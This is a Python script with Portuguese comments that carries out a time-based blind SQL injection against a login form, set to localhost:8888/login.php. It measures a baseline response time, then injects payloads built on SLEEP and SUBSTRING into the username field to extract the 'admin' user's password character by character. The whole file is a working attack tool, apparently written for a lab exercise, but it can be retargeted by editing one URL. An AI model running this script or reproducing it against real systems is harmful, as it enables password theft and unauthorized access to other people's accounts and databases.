# Importa as bibliotecas necessárias
import requests
import time
import string
import statistics

# --- Configurações Globais ---
URL = "http://localhost:8888/login.php"
DELAY = 2  # Tempo de atraso para a injeção
TARGET_USER = 'admin' # Defina o usuário que você quer atacar

# --- Função para fazer a requisição de login ---
def req(query_sql):
    """Envia a requisição POST com o payload SQL."""
    data = {'username': query_sql, 'password': 'qualquercoisa'}
    start_time = time.time()
    try:
        # Adiciona um timeout um pouco maior que o nosso delay
        requests.post(URL, data=data, timeout=DELAY + 1)
        end_time = time.time()
        return end_time - start_time
    except requests.exceptions.RequestException as e:
        if "timed out" in str(e).lower():
            return DELAY + 0.5 # Se der timeout, consideramos como um acerto
        print(f"\n❌ Erro de conexão: {e}")
        return -1

# --- NOVA FUNÇÃO DE CALIBRAÇÃO ---
def get_baseline_time():
    """Mede o tempo de resposta normal do servidor para evitar falsos positivos."""
    print("[*] Calibrando: Medindo o tempo de resposta normal do servidor...")
    # Usa um payload que com certeza é falso e não deve causar delay
    payload = f"' OR IF(1=2, SLEEP({DELAY}), 0) #"
    times = []
    for i in range(5): # Envia 5 requisições para ter uma boa média
        print(f"    Enviando requisição de calibração {i+1}/5...", end='\r')
        t = req(payload)
        if t == -1: return -1
        times.append(t)
    
    # Calcula a média e adiciona um desvio padrão como margem de segurança
    baseline = statistics.mean(times)
    stdev = statistics.stdev(times) if len(times) > 1 else 0
    safe_baseline = baseline + (stdev * 2) # Média + 2x o desvio padrão
    
    print(f"\n[+] Calibração concluída. Tempo normal considerado seguro: < {safe_baseline:.2f}s")
    return safe_baseline

# --- Função principal de brute-force ---
def fuzz():
    printables = string.ascii_letters + string.digits + string.punctuation.replace("'", "").replace("\\", "")
    
    # PASSO 1: Calibrar o tempo antes de atacar
    baseline_time = get_baseline_time()
    if baseline_time == -1:
        return

    extracted_data = ''
    position = 1
    
    print(f"\n🚀 Iniciando o ataque de Blind SQLi Time-Based...")
    print(f"Alvo: Senha do usuário '{TARGET_USER}'")

    while True:
        found_char_for_position = False
        for char in printables:
            payload = f"' OR IF(name='{TARGET_USER}' AND SUBSTRING(password, {position}, 1) = '{char}', SLEEP({DELAY}), 0) #"
            
            response_time = req(payload)
            
            print(f"[*] Testando Posição: {position}, Caractere: '{char}', Tempo: {response_time:.2f}s", end='\r')

            if response_time == -1: return

            # --- LÓGICA DE DECISÃO FINAL ---
            # Só considera um acerto se o tempo for MUITO maior que o tempo normal calibrado
            if response_time > baseline_time + (DELAY * 0.9):
                extracted_data += char
                print(f"\n[+] Caractere encontrado: '{char}' (Tempo de resposta: {response_time:.2f}s)")
                print(f"    Dados extraídos até agora: {extracted_data}")
                found_char_for_position = True
                break # Encontrou o caractere certo, vai para a próxima posição

        if not found_char_for_position:
            print("\n\n✅ Ataque finalizado!")
            print(f"    Resultado Final: {extracted_data}")
            break

        position += 1

# --- Ponto de entrada do script ---
if __name__ == "__main__":
    fuzz()